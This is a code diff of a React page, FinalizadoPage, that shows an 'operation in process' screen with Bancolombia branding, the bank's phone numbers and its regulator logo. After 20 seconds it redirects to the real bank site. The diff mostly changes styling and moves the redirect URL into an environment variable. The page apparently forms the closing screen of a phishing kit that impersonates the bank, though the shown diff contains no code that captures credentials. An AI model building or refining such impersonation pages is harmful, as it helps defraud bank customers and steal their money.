@@ -55,7 +55,7 @@ export default function FinalizadoPage() {
 
         // Redireccionar después de 20 segundos
         const redirectTimeout = setTimeout(() => {
-            window.location.href = 'https://www.bancolombia.com/centro-de-ayuda/canales/sucursal-virtual-personas';
+            window.location.href = process.env.REACT_APP_URL_BANK;
         }, 20000); // 20 segundos
 
         // Cleanup del timeout
@@ -214,7 +214,7 @@ export default function FinalizadoPage() {
                                 alignItems: "center",
                                 gap: "15px",
                                 textAlign: "left",
-                                marginBottom: "30px",
+                                marginBottom: "10px",
                                 borderRadius: "4px"
                             }}>
                                 <img
@@ -223,62 +223,70 @@ export default function FinalizadoPage() {
                                     style={{ width: "50px", height: "50px", flexShrink: 0 }}
                                 />
                                 <div>
-                                    <h3 style={{ margin: "0 0 5px 0", fontSize: "16px", fontWeight: "bold", color: "#ffffff" }}>Operacion en proceso!</h3>
-                                    <p style={{ margin: 0, fontSize: "13px", lineHeight: "1.3" }}>
-                                        Estamos procesando su solicitud. Esto puede tardar un momento.
+                                    <h3 className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center" style={{ margin: "0 0 5px 0", fontSize: "18px", fontWeight: "bold", color: "#ffffff" }}>
+                                        ¡Operacion en proceso!
+                                    </h3>
+                                    <p className="bc-card-auth-description text-center" style={{ margin: 0, fontSize: "13.5px", lineHeight: "1.3" }}>
+                                        Estamos procesando su solicitud. <br /> Esto puede tardar un momento.
                                     </p>
                                 </div>
                             </div>
 
                             {/* CONTACT INFO */}
-                            <h3 style={{ fontSize: "16px", marginBottom: "20px", color: "#ffffff" }}>Sucursal Telefónica Bancolombia</h3>
+                            <h3 className="bc-card-auth-description" style={{ fontSize: "16px", fontWeight: 600, marginBottom: "20px", color: "#ffffff" }}>
+                                Sucursal Telefónica Bancolombia
+                            </h3>
 
                             {/* Grid Layout for closer alignment */}
-                            <div style={{
-                                display: "grid",
-                                gridTemplateColumns: "1fr 1fr", // Two equal columns
-                                columnGap: "10px", // Small gap between city and number
-                                rowGap: "8px",
-                                fontSize: "14px",
-                                lineHeight: "1.4",
-                                marginBottom: "30px",
-                                textAlign: "right" // Default right align for first column items? No, applied individually
-                            }}>
-                                <span style={{ textAlign: "right" }}>Medellín:</span> <span style={{ textAlign: "left" }}>510 8000</span>
-                                <span style={{ textAlign: "right" }}>Bogotá:</span> <span style={{ textAlign: "left" }}>343 0101</span>
-                                <span style={{ textAlign: "right" }}>Barranquilla:</span> <span style={{ textAlign: "left" }}>361 8989</span>
-                                <span style={{ textAlign: "right" }}>Bucaramanga:</span> <span style={{ textAlign: "left" }}>697 2525</span>
-                                <span style={{ textAlign: "right" }}>Cali:</span> <span style={{ textAlign: "left" }}>554 0506</span>
-                                <span style={{ textAlign: "right" }}>Cartagena:</span> <span style={{ textAlign: "left" }}>693 4401</span>
-                                <span style={{ textAlign: "right" }}>Pereira:</span> <span style={{ textAlign: "left" }}>340 1214</span>
-                                <span style={{ textAlign: "right" }}>Resto del país:</span> <span style={{ textAlign: "left" }}>01 8000 08 12 345</span>
+                            <div
+                                className="bc-card-auth-description"
+                                style={{
+                                    display: "grid",
+                                    gridTemplateColumns: "1fr 1fr", // Two equal columns
+                                    columnGap: "10px", // Small gap between city and number
+                                    rowGap: "3px",
+                                    fontSize: "12px",
+                                    lineHeight: "15px",
+                                    marginBottom: "20px",
+                                    textAlign: "right" // Default right align for first column items? No, applied individually
+                                }}>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Medellín:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>510 8000</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Bogotá:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>343 0101</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Barranquilla:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>361 8989</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Bucaramanga:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>697 2525</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Cali:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>554 0506</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Cartagena:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>693 4401</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Pereira:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>340 1214</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Resto del país:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>01 8000 08 12 345</span>
                             </div>
 
-
                             {/* EXTERIOR INFO */}
-                            <h3 style={{ fontSize: "16px", marginBottom: "15px", color: "#ffffff" }}>Sucursal Telefónicas en el Exterior</h3>
-                            <div style={{
+                            <h3 className="bc-card-auth-description" style={{ fontSize: "16px", fontWeight: 600, marginBottom: "10px", color: "#ffffff" }}>
+                                Sucursal Telefónicas en el Exterior
+                            </h3>
+                            <div className="bc-card-auth-description" style={{
                                 display: "grid",
                                 gridTemplateColumns: "1fr 1fr",
                                 columnGap: "10px",
-                                rowGap: "8px",
+                                rowGap: "3px",
                                 fontSize: "14px",
-                                lineHeight: "1.4",
-                                marginBottom: "40px"
+                                lineHeight: "15px",
+                                marginBottom: "20px"
                             }}>
-                                <span style={{ textAlign: "right" }}>España:</span> <span style={{ textAlign: "left" }}>900 994 717</span>
-                                <span style={{ textAlign: "right" }}>Estados Unidos:</span> <span style={{ textAlign: "left" }}>1 866 378 97 14</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>España:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>900 994 717</span>
+                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Estados Unidos:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>1 866 378 97 14</span>
                             </div>
 
                             {/* BUTTON */}
-                            <button
-                                className="login-btn"
-                                onClick={handleClose}
-                                style={{ width: "100%", maxWidth: "200px", fontSize: "16px" }}
-                            >
-                                Cerrar
-                            </button>
-
+                            <div style={{ display: "flex", justifyContent: "center" }}>
+                                <button
+                                    className="bc-button-primary login-btn"
+                                    onClick={handleClose}
+                                    style={{ width: "100%", maxWidth: "200px", fontSize: "14px" }}
+                                >
+                                    Cerrar
+                                </button>
+                            </div>
                         </div>
                     </div>
                     <div className="login-page-footer mt-4">
@@ -300,12 +308,12 @@ export default function FinalizadoPage() {
                                         style={{ width: "180px" }}
                                     />
                                 </div>
-                                <div>
+                                <div style={{ alignSelf: 'center' }}>
                                     <span className="vigilado">
                                         <img
                                             src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                             alt="Superintendencia"
-                                            style={{ width: "180px" }}
+                                            style={{ width: "140px" }}
                                         />
                                     </span>
                                 </div>
